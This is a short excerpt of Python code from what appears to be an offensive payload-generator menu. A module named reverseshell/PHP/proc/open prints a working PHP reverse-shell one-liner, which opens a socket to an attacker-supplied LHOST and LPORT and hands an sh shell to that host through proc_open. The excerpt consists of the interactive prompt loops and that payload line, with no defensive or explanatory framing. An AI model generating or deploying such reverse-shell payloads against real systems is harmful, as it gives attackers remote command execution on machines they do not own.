...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/PHP/proc/open\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/PHP/proc/open\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mphp -r '$sock=fsockopen("{LHOST}",{LPORT});$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
""")
